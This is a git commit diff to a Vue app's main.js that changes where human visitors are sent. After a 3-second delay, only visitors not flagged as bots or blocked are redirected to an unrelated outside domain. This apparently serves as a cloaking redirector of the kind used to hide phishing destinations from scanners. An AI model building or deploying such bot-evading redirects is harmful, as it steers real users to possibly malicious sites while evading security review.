b3942bbc157f7a4e5360dcf41f67bf0367761f8c
husknet <127146284+husknet@users.noreply.github.com>
2025-01-15 15:35:40 +0000

    Update main.js

--- src/main.js
+++ src/main.js
@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://tk.altinbasaknevresim.com.tr/';
+          window.location.href = 'https://ost.hst-ltd.com/';
         }, 3000);
       }
     });
